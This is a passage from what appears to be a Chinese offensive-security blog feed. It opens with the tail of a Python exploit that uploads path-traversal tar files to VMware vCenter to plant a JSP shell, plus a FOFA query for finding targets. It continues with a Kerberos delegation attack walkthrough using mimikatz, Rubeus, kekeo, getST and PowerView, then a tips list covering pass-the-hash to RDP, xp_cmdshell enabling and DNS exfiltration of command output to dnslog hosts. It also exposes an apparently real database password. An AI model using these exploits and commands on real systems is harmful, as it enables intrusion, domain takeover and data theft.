class="hljs-string">&#x27;..\\..\\ProgramData\\VMware\\vCenterServer\\runtime\\vsphere-ui\\server\\work\\deployer\s\\global\\40\\0\\h5ngc.war\\resources\\&#x27;</span>+file_in.split(<span class="hljs-string">&#x27;\\&#x27;</span>)[-<span class="hljs-number">1</span>])<br>    tf.close()<br>    <span class="hljs-comment"># linux_shell</span><br>    tf1 = tarfile.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;lin.tar&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>)<br>    tf1.add(file_in,<span class="hljs-string">&#x27;..\\..\\usr\\lib\\vmware-vsphere-ui\\server\\work\\deployer\\s\\global\\42\\0\\h5ngc.war\\resources\\&#x27;</span>+file_in.split(<span class="hljs-string">&#x27;\\&#x27;</span>)[-<span class="hljs-number">1</span>])<br>    tf1.close()<br>    <span class="hljs-keyword">return</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">uoloadova</span>(<span class="hljs-params">url,files</span>):</span><br>    url1 = url + <span class="hljs-string">&#x27;/ui/vropspluginui/rest/services/uploadova&#x27;</span><br>    url2 = url + <span class="hljs-string">&#x27;/ui/resources/test1.jsp&#x27;</span><br>    <span class="hljs-keyword">try</span>:<br>        a = requests.post(url1,files=files,verify=<span class="hljs-literal">False</span>)<br>        <span class="hljs-keyword">if</span> a.status_code ==<span class="hljs-number">200</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;SUCCESS&#x27;</span> <span class="hljs-keyword">in</span> a.content:<br>            <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;[+] tar upload success&#x27;</span><br>            <span class="hljs-keyword">if</span> requests.get(url2,verify=<span class="hljs-literal">False</span>).status_code == <span class="hljs-number">200</span>:<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><br><br>create_tar(file_in)<br>files1 = &#123;<span class="hljs-string">&#x27;uploadFile&#x27;</span>: <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;lin.tar&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>)&#125; <br>files2 = &#123;<span class="hljs-string">&#x27;uploadFile&#x27;</span>: <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;win.tar&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>)&#125;<br><span class="hljs-keyword">if</span> uoloadova(url,files1) == <span class="hljs-literal">True</span> <span class="hljs-keyword">or</span> uoloadova(url,files2) == <span class="hljs-literal">True</span>:<br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;[+] exploited&#x27;</span><br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;[+] your file uploaded is : &#x27;</span>+ url + <span class="hljs-string">&#x27;/ui/resources/&#x27;</span>+file_in.split(<span class="hljs-string">&#x27;\\&#x27;</span>)[-<span class="hljs-number">1</span>]<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;[-] failed&#x27;</span><br><br>    <br></code></pre></td></tr></table></figure><h3 id="fofa搜索语句"><a href="#fofa搜索语句" class="headerlink" title="fofa搜索语句"></a>fofa搜索语句</h3><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">body</span>=<span class="hljs-string">&quot;VMware vSphere is virtual&quot;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Exp</tag>
      
      <tag>Web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>委派详解</title>
    <link href="/2021/02/05/lan_fan_qie/"/>
    <url>/2021/02/05/lan_fan_qie/</url>
    
    <content type="html"><![CDATA[<h1 id="委派详解"><a href="#委派详解" class="headerlink" title="委派详解"></a>委派详解</h1><h2 id="Kerberos委派攻击"><a href="#Kerberos委派攻击" class="headerlink" title="Kerberos委派攻击"></a>Kerberos委派攻击</h2><p>域委派是指将域内用户的权限委派给服务账号，使得服务账号能以用户的权限在域内展开活动。</p><ul><li><p>使用场景：</p><p>例如 <code>用户A</code> 需要访问 <code>服务用户B</code> 提供的 <code>http</code> 服务，但是B的http服务调用了 <code>用户C</code> 的 <code>mssql</code> 服务，这个时候如果B设置了委派属性，B可以A的身份委访问C的服务。</p></li></ul><h3 id="非约束委派"><a href="#非约束委派" class="headerlink" title="非约束委派"></a>非约束委派</h3><p>机器用户和服务用户默认可开启委派，非约束委派顾名思义即为通过其可委派任何服务。当用户请求该账户时，会发送自己的TGT，并保存在该服务账户的内存中，该账户即可通过此票据以用户的身份请求访问任何服务。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs css">* 域控：08<span class="hljs-selector-tag">r2</span> <br>* 用户: <span class="hljs-selector-tag">administrator</span><br>* 机器账户：<span class="hljs-selector-tag">km2008</span><br><br>    1. <span class="hljs-selector-tag">km2008</span> 在 <span class="hljs-selector-tag">adsiedit</span><span class="hljs-selector-class">.msc</span> 中科打开委派功能<br>    2. 以 <span class="hljs-selector-tag">administrator</span> 身份通过 <span class="hljs-selector-tag">winrm</span> 或 <span class="hljs-selector-tag">mssql</span> 连接 <span class="hljs-selector-tag">km2008</span><br>    3. 通过<span class="hljs-selector-tag">mimikatz</span>到处域管的票据<br>        <span class="hljs-selector-tag">privilege</span><span class="hljs-selector-pseudo">::debug</span> <br>        <span class="hljs-selector-tag">sekurlsa</span><span class="hljs-selector-pseudo">::tickets</span> /<span class="hljs-selector-tag">export</span><br>    4. 通过<span class="hljs-selector-tag">mimikatz</span>将票据注入到内存<br>        <span class="hljs-selector-tag">kerberos</span><span class="hljs-selector-pseudo">::ptt</span> <span class="hljs-selector-attr">[0;1622d8]</span><span class="hljs-selector-tag">-2-0-60a00000-Administrator</span><span class="hljs-keyword">@krbtgt-QIYOU</span>.COM.kirbi<br>    <span class="hljs-number">5</span>.  我们就可以在km2008上以域管的身份访问域控。(域控要用主机名或FQDN)<br></code></pre></td></tr></table></figure><p>winrm远程执行命令：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Windows</span> Server <span class="hljs-number">2012</span>及以上默认是开启WinRM服务的，Windows Server <span class="hljs-number">2008</span> R<span class="hljs-number">2</span>需要winrm quickconfig -q来启动WinRM服务，还要注意一点就是这条命令运行后会自动添加防火墙策略，防火墙默认会放行<span class="hljs-number">5985</span>端口的。<br></code></pre></td></tr></table></figure><h4 id="非约束委派＋打印机"><a href="#非约束委派＋打印机" class="headerlink" title="非约束委派＋打印机"></a>非约束委派＋打印机</h4><p>非约束委派需要用户主动连接，因此稍显鸡肋，但是我们可以通过 windows 的远程打印服务，强制运行spooler.exe的机器对我们选择的目标进行身份验证。</p><p>poc: <a href="https://github.com/leechristensen/SpoolSample">https://github.com/leechristensen/SpoolSample</a></p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs smali">* 域控：dm <br>* 用户: administrator<br>* 机器账户：km2008<br><br>    1. 现在我们拥有了km2008机器的本地管理员控制权，且其可以开启委派功能。<br>    2. 运行spoolsample.exe ：<br>        &gt; spoolsample.exe dm km2008<br>    3. 使用 Rubeus 监听本地：<br>        &gt; Rubeus.exe<span class="hljs-built_in"> monitor </span>/interval:1 /filteruser:dms$<br>    4. Rubeus可直接将捕获到的base64编码的证书导入内存<br>        &gt; Rubeus.exe ptt /ticket:base64<br>    5. mimikatz导出后就如同上面的操作了<br></code></pre></td></tr></table></figure><h3 id="约束委派"><a href="#约束委派" class="headerlink" title="约束委派"></a>约束委派</h3><p>顾名思义，被委派用户不能随意访问服务，只能访问被限定的服务内容。委派时保留st1而不是tgt给账户，st1包含用户授权信息但不允许其代表用户访问任意其他服务。</p><p>微软为保证委派的安全性引入S4U协议，该协议支持两个扩展：S4U2self、S4U2proxy。**<em>2self代表自身请求代表自身的st、2proxy代表代替用户请求代表用户的st**</em>。约束委派限制了2proxy的范围。</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200207103902-002e844c-4953-1.png" alt="img"></p><p>其中步骤1-4代表 <code>S4U2Self</code> 请求的过程，步骤5-10代表 <code>S4U2proxy</code>的请求过程</p><h4 id="约束委派的利用"><a href="#约束委派的利用" class="headerlink" title="约束委派的利用"></a>约束委派的利用</h4><h5 id="常规利用"><a href="#常规利用" class="headerlink" title="常规利用"></a>常规利用</h5><ul><li><p>利用结果很像是白银票据，但是并不需要直接获得想要请求的服务的hash</p></li><li><p>通过服务用户的明文或者ntlm，伪造用户发起s4u请求，伪装成任意用户访问被委派的服务。</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">利用工具：kekeo.exe<br>条件：1.服务用户的明文or哈希<br>   2.委派权限<br><br>1. 通过服务用户的口令请求tgt<br>&gt; tgt::ask /user:fuwu /domain:test.local /password:password <br><span class="hljs-comment"># 将会在目录生成票据</span><br>2. 以administrator身份请求对其他服务的st（服务票据）<br>&gt; tgs::s4u /tgt:TGT_fuwu@TEST.LOCAL_krbtgt~test.local@TEST.LOCAL.kirbi /user:Administrator@test.local /service:cifs/dm08.test.local<br>3. 导入st<br>&gt; kerberos::ptt TGS_Administrator@test.local@TEST.LOCAL_cifs~dm08.test.local@TEST.LOCAL.kirbi<br></code></pre></td></tr></table></figure><h5 id="约束委派加黄金票据"><a href="#约束委派加黄金票据" class="headerlink" title="约束委派加黄金票据"></a>约束委派加黄金票据</h5></li><li><p>通过将被委派对象设置成krbtgt，可以达成和黄金票据一样的效果（同理，就和获得了krbtgt的hash可以制作金票一样，本身就是白银票据的效果）</p></li><li><p>可以用<code>impacket</code>系列的<code>getST</code>向KDC请求administrator的TGT</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">getST.exe -dc-ip 192.168.141.145 -spn krbtgt/test.local -impersonate Administrator test.local/fuwu:password<br><br><span class="hljs-comment"># -impersonate：表示伪造用户</span><br><span class="hljs-comment"># -spn：表示我们要委派的服务的spn，这里是TGS</span><br><span class="hljs-comment"># -dc-ip：域控ip</span><br></code></pre></td></tr></table></figure></li><li><p>执行成功会生成一个域控的缓存文件，使用mimikatz的ptc将其导入</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">kerberos</span><span class="hljs-selector-pseudo">::ptc</span> <span class="hljs-selector-tag">Administrator</span><span class="hljs-selector-class">.cache</span><br></code></pre></td></tr></table></figure><h3 id="基于资源的约束委派"><a href="#基于资源的约束委派" class="headerlink" title="基于资源的约束委派"></a>基于资源的约束委派</h3></li></ul><p><img src="https://nosec.org/avatar/uploads/attach/image/a8f21c017a3d8852dbc8a2510f6fefc1/aa.png" alt="aa.png"></p><ul><li>不再需要域管理员权限去设置相关属性。基于资源的约束委派把设置委派的权限赋予了机器自身，既机器自己可以决定谁可以被委派来控制我。也就是说机器自身可以直接在自己账户上配置msDS-AllowedToActOnBehalfOfOtherIdentity属性来设置RBCD。</li><li>就算S4U2Self返回的票据不可转发（可不可以转发由TrustedToAuthenticationForDelegation决定），S4U2Proxy也是可以成功，并且S4U2Proxy返回的票据总是可转发。</li><li>利用条件：简单来说就是你获得的用户对该主机的属性具有写权限，那么这个用户就可以对该主机进行攻击。（获取机器的system权限）</li></ul><h4 id="基于资源的约束委派的利用"><a href="#基于资源的约束委派的利用" class="headerlink" title="基于资源的约束委派的利用"></a>基于资源的约束委派的利用</h4><p>还是利用之前的例子来做说明：</p><ul><li>目标机器：vul.test.local</li><li>用户：test.local\user1（对目标机器有写权限 ）</li></ul><p>利用过程如下：</p><ul><li><p>查看用户权限，利用harmj0y的<a href="https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993">PowerView</a></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Get-DomainUser</span> <span class="hljs-literal">-Identity</span> user1 <span class="hljs-literal">-Properties</span> objectsid<br><span class="hljs-comment"># 获取用户的sid</span><br><span class="hljs-built_in">Get-DomainObjectAcl</span> <span class="hljs-literal">-Identity</span> vul | ?&#123;<span class="hljs-variable">$_</span>.SecurityIdentifier <span class="hljs-operator">-match</span> <span class="hljs-string">&quot;S-1-5-21-662417213-3583657854-423750704-1001&quot;</span>&#125;<br><span class="hljs-comment"># 根据sid查询用户对机器的权限</span><br></code></pre></td></tr></table></figure><p><code>GenericAll、GenericWrite、WriteProperty、WriteDacl</code> 等权限可修改机器属性</p></li><li><p>创建一个机器用户，使用<a href="https://github.com/Kevin-Robertson/Powermad">Powermad</a></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">New-MachineAccount</span> <span class="hljs-literal">-MachineAccount</span> evilsystem <span class="hljs-literal">-Password</span> <span class="hljs-variable">$</span>(<span class="hljs-built_in">ConvertTo-SecureString</span> <span class="hljs-string">&quot;fuwu&quot;</span> <span class="hljs-literal">-AsPlainText</span> <span class="hljs-literal">-Force</span>)<br></code></pre></td></tr></table></figure><p>创建一个计算机用户<code>fuwusystem</code></p></li><li><p>配置fuwusystem到vul的基于资源约束的委派（PowerView）</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$SD</span> = <span class="hljs-built_in">New-Object</span> Security.AccessControl.RawSecurityDescriptor <span class="hljs-literal">-ArgumentList</span> <span class="hljs-string">&quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-662417213-3583657854-423750704-1115)&quot;</span><br><span class="hljs-variable">$SDBytes</span> = <span class="hljs-built_in">New-Object</span> byte[] (<span class="hljs-variable">$SD</span>.BinaryLength)<br><span class="hljs-comment"># 生成代表属性值的字节型数组</span><br><span class="hljs-variable">$SD</span>.GetBinaryForm(<span class="hljs-variable">$SDBytes</span>, <span class="hljs-number">0</span>)<br><span class="hljs-built_in">Get-DomainComputer</span> vul| <span class="hljs-built_in">Set-DomainObject</span> <span class="hljs-literal">-Set</span> <span class="hljs-selector-tag">@</span>&#123;<span class="hljs-string">&#x27;msds-allowedtoactonbehalfofotheridentity&#x27;</span>=<span class="hljs-variable">$SDBytes</span>&#125; <span class="hljs-literal">-Verbose</span><br><span class="hljs-comment"># 设置属性值</span><br></code></pre></td></tr></table></figure></li><li><p>验证是否成功添加</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Get-DomainComputer</span> vul <span class="hljs-literal">-Properties</span> msds<span class="hljs-literal">-allowedtoactonbehalfofotheridentity</span><br></code></pre></td></tr></table></figure></li><li><p>清除<code>msds-allowedtoactonbehalfofotheridentity</code>属性的值</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Set-DomainObject</span> vul <span class="hljs-literal">-Clear</span> <span class="hljs-string">&#x27;msds-allowedtoactonbehalfofotheridentity&#x27;</span> <span class="hljs-literal">-Verbose</span><br></code></pre></td></tr></table></figure></li><li><p>也可以直接通过AD模块修改（server2012及以上）</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Set-ADComputer</span> vul <span class="hljs-literal">-PrincipalsAllowedToDelegateToAccount</span> fuwusystem<span class="hljs-variable">$</span><br><span class="hljs-built_in">Get-ADComputer</span> vul <span class="hljs-literal">-Properties</span> PrincipalsAllowedToDelegateToAccount<br></code></pre></td></tr></table></figure><ul><li><p>该模块仅在域控安装，可将域控的 <code>Microsoft.ActiveDirectory.Management.dll</code> 文件导出</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">import-module</span> Microsoft.ActiveDirectory.Management.dll<br></code></pre></td></tr></table></figure></li></ul></li><li><p>之后的攻击步骤与约束委派相同</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">getST.exe -dc-ip 192.168.141.145 -spn cifs/dm2008 -impersonate Administrator test.local/fuwusystem$:password<br></code></pre></td></tr></table></figure><p><img src="C:\Users\Mi\AppData\Roaming\Typora\typora-user-images\image-20210205074422901.png" alt="image-20210205074422901"></p></li></ul><h4 id="设置了不可委派的用户的利用"><a href="#设置了不可委派的用户的利用" class="headerlink" title="设置了不可委派的用户的利用"></a>设置了不可委派的用户的利用</h4><p>域内高权限用户是默认不可被委派的（例如adminsitrator）即s4u2self不可转发，s4u2proxy转发会失败</p><p>国外的师傅分析了原因是S4U2self返回的票据缺失SPN，那只需要补全即可</p><p>Rubeus实现了这个功能：</p><ul><li><p>先将s4u2self票据导出为test.kirbi</p></li><li><p>补全spn</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">Rubeus.exe tgssub <span class="hljs-regexp">/ticket:test.kirbi /</span>altservice:cifs<span class="hljs-regexp">/vul /</span>ptt<br>Rubeus.exe tgssub <span class="hljs-regexp">/ticket:test.kirbi /</span>altservice:host<span class="hljs-regexp">/vul /</span>ptt<br></code></pre></td></tr></table></figure></li></ul>]]></content>
    
    
    <categories>
      
      <category>AD</category>
      
    </categories>
    
    
    <tags>
      
      <tag>AD</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>一些日常小tips</title>
    <link href="/2021/02/03/tips/"/>
    <url>/2021/02/03/tips/</url>
    
    <content type="html"><![CDATA[<h1 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h1><h4 id="搜索引擎语法：https-blog-csdn-net-weixin-45116657-article-details-102761464"><a href="#搜索引擎语法：https-blog-csdn-net-weixin-45116657-article-details-102761464" class="headerlink" title="搜索引擎语法：https://blog.csdn.net/weixin_45116657/article/details/102761464"></a>搜索引擎语法：<a href="https://blog.csdn.net/weixin_45116657/article/details/102761464">https://blog.csdn.net/weixin_45116657/article/details/102761464</a></h4><hr><h4 id="CVE-2020-14386-Linux-kernel权限提升漏洞"><a href="#CVE-2020-14386-Linux-kernel权限提升漏洞" class="headerlink" title="CVE-2020-14386: Linux kernel权限提升漏洞 :"></a>CVE-2020-14386: Linux kernel权限提升漏洞 :</h4><p>内核提权漏洞，poc：<a href="https://www.openwall.com/lists/oss-security/2020/09/03/3">https://www.openwall.com/lists/oss-security/2020/09/03/3</a></p><hr><p>php imap命令执行：imap_open调用rsh连接远程，但是debain默认使用ssh，ssh存在-o雕鹰系统命令，因此存在命令注入。</p><p><img src="/img/article/typora-user-images%5Cimage-20201012131444039.png" alt="image-20201012131444039"></p><hr><p>各种waf：<a href="https://mp.weixin.qq.com/s/PWkqNsygi-c_S7tW1y_Hxw">https://mp.weixin.qq.com/s/PWkqNsygi-c_S7tW1y_Hxw</a></p><hr><p>excel导入打xxe</p><p><a href="https://xz.aliyun.com/t/3741">https://xz.aliyun.com/t/3741</a></p><hr><p>启动apache</p><p><code>/etc/init.d/apache2 start</code></p><hr><p>ssh软连接</p><p><a href="https://www.jozxing.cc/archives/1653">https://www.jozxing.cc/archives/1653</a></p><hr><p>apache shiro</p><p><a href="https://www.cnblogs.com/nul1/p/12827021.html">https://www.cnblogs.com/nul1/p/12827021.html</a></p><hr><p>提权合集</p><p><a href="https://mp.weixin.qq.com/s/gijFjloNrEshsSaiMHr8oQ">https://mp.weixin.qq.com/s/gijFjloNrEshsSaiMHr8oQ</a></p><hr><p>jwt</p><p><a href="https://xz.aliyun.com/t/6776#toc-10">https://xz.aliyun.com/t/6776#toc-10</a></p><hr><p>winrm 执行命令、端口复用</p><p><a href="https://blog.csdn.net/k8gege/article/details/106442655">https://blog.csdn.net/k8gege/article/details/106442655</a></p><hr><p>红队工具</p><p><a href="https://github.com/root-tools/redtool">https://github.com/root-tools/redtool</a></p><hr><p>pth+rdp</p><p><a href="https://www.dazhuanlan.com/2020/01/18/5e22c1493adef/">https://www.dazhuanlan.com/2020/01/18/5e22c1493adef/</a></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">privilege</span><span class="hljs-selector-pseudo">::debug</span><br><span class="hljs-selector-tag">sekurlsa</span><span class="hljs-selector-pseudo">::pth</span> /<span class="hljs-selector-tag">user</span><span class="hljs-selector-pseudo">:administrator</span> /<span class="hljs-selector-tag">domain</span><span class="hljs-selector-pseudo">:.</span> /<span class="hljs-selector-tag">ntlm</span><span class="hljs-selector-pseudo">:xxxxxxxxxxxxxxxxxxxxxx</span> &quot;/<span class="hljs-selector-tag">run</span><span class="hljs-selector-pseudo">:mstsc.exe</span> /<span class="hljs-selector-tag">restrictedadmin</span>&quot;<br></code></pre></td></tr></table></figure><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">条件：<br><span class="hljs-keyword">Server</span>需要开启Restricted <span class="hljs-keyword">Admin</span> mode<br>Windows <span class="hljs-number">7</span> 和 Windows <span class="hljs-keyword">Server</span> <span class="hljs-number">2008</span> R2默认不支持，需要安装补丁<span class="hljs-number">2871997</span>、<span class="hljs-number">2973351</span><br></code></pre></td></tr></table></figure><p>开启Restricted Admin mode:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">REG ADD HKLM\System\CurrentControlSet\Control\Lsa <span class="hljs-regexp">/v DisableRestrictedAdmin /</span>t REG_DWORD <span class="hljs-regexp">/d 00000000 /</span>f<br></code></pre></td></tr></table></figure><hr><p>设备默认口令</p><p><a href="http://www.srxh1314.com/mrkl.html">http://www.srxh1314.com/mrkl.html</a></p><hr><p>ue上传</p><p><a href="https://zhuanlan.zhihu.com/p/42888106">https://zhuanlan.zhihu.com/p/42888106</a></p><hr><p>无回显外带</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">cmd</span> /v /c &quot;whoami &gt; temp &amp;&amp; certutil -encode temp temp2 &amp;&amp; <span class="hljs-built_in">findstr</span> /L /V &quot;CERTIFICATE&quot; temp2 &gt; temp3 &amp;&amp; <span class="hljs-built_in">set</span> /p MYVAR=&lt; temp3 &amp;&amp; <span class="hljs-built_in">set</span> FINAL=<span class="hljs-variable">!MYVAR!</span>.b9530dbeff7692920356.d.zhack.ca &amp;&amp; nslookup <span class="hljs-variable">!FINAL!</span>&quot;<br><br>或<br><br><span class="hljs-keyword">for</span> /F &quot;delims=\ tokens=<span class="hljs-number">2</span>&quot; %i <span class="hljs-keyword">in</span> (&#x27;whoami&#x27;) <span class="hljs-keyword">do</span> <span class="hljs-built_in">ping</span> -n <span class="hljs-number">1</span> %i.bm21t3.dnslog.cn<br></code></pre></td></tr></table></figure><hr><p>pth + rdp</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">sekurlsa</span><span class="hljs-selector-pseudo">::pth</span> /<span class="hljs-selector-tag">user</span><span class="hljs-selector-pseudo">:administrator</span> /<span class="hljs-selector-tag">domain</span><span class="hljs-selector-pseudo">:.</span> /<span class="hljs-selector-tag">ntlm</span><span class="hljs-selector-pseudo">:xxxxxxxxxxxxxxxxxxxxxx</span> &quot;/<span class="hljs-selector-tag">run</span><span class="hljs-selector-pseudo">:mstsc.exe</span> /<span class="hljs-selector-tag">restrictedadmin</span>&quot;<br></code></pre></td></tr></table></figure><hr><p>清除日志</p><p><img src="https://p6-tt-ipv6.byteimg.com/large/pgc-image/b2f859ff474f4dabb7390f10ea1dff59" alt="img"></p><hr><p>linux提权：</p><p><a href="https://mp.weixin.qq.com/s?__biz=MjM5NjA0NjgyMA==&amp;mid=2651102317&amp;idx=1&amp;sn=0b0a840bd30896eb28b02ac117700bad&amp;chksm=bd1f0ee68a6887f00b1bfbf8996d516abfed498e264561e4d022de359beacb96efe10c000733&amp;scene=132#wechat_redirect">https://mp.weixin.qq.com/s?__biz=MjM5NjA0NjgyMA==&amp;mid=2651102317&amp;idx=1&amp;sn=0b0a840bd30896eb28b02ac117700bad&amp;chksm=bd1f0ee68a6887f00b1bfbf8996d516abfed498e264561e4d022de359beacb96efe10c000733&amp;scene=132#wechat_redirect</a></p><hr><p>mssql cmd</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs mssql">-- 判断用户<br>and 1&#x3D;(select IS_SRVROLEMEMBER(&#39;public&#39;) )--<br>and 1&#x3D;(select IS_SRVROLEMEMBER(&#39;sysadmin&#39;) )--<br>and 1&#x3D;(select IS_SRVROLEMEMBER(&#39;db_owner&#39;) )--<br><br>-- 开启xp_cmdshell<br>EXEC sp_configure &#39;show advanced options&#39;,1<br>RECONFIGURE<br><br>EXEC sp_configure &#39;xp_cmdshell&#39;,1<br>RECONFIGURE<br><br>EXEC master..xp_cmdshell &#39;123.zpu2he.dnslog.cn&#39;<br><br>-- RECONFIGURE报错的话就用<br>reconfigure with override<br></code></pre></td></tr></table></figure><hr><p>mysqldump</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">mysqldump --defaults-extra-<span class="hljs-keyword">file</span>=<span class="hljs-regexp">/tmp/</span><span class="hljs-number">11</span>.cnf --databases jiebei_com &gt;<span class="hljs-regexp">/home/</span>www<span class="hljs-regexp">/jb.com/</span><span class="hljs-keyword">runtime</span><span class="hljs-regexp">/log/</span><span class="hljs-number">202010</span>/jiebei_com.sql<br></code></pre></td></tr></table></figure><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[client]</span><br><span class="hljs-attr">port</span> = <span class="hljs-number">3306</span><br><span class="hljs-attr">socket</span> = /tmp/mysql.sock<br><span class="hljs-attr">default-character-set</span> = utf8mb4<br><span class="hljs-attr">host</span> = <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><br><span class="hljs-attr">user</span> = <span class="hljs-string">&#x27;jiebei_com&#x27;</span><br><span class="hljs-attr">password</span> = <span class="hljs-string">&#x27;k7SHT62npa3j8RrS&#x27;</span><br></code></pre></td></tr></table></figure><hr><p>SimplyEmail</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">./<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">SimplyEmail</span>.</span></span>py -all -v -e <br></code></pre></td></tr></table></figure><hr><p>xray扫描</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">.\<span class="hljs-selector-tag">xray_windows_amd64</span><span class="hljs-selector-class">.exe</span> <span class="hljs-selector-tag">webscan</span> <span class="hljs-selector-tag">--listen</span> 127.0.0.1<span class="hljs-selector-pseudo">:7777</span> <span class="hljs-selector-tag">--html-output</span> <span class="hljs-selector-tag">zyhy3</span><span class="hljs-selector-class">.html</span><br><span 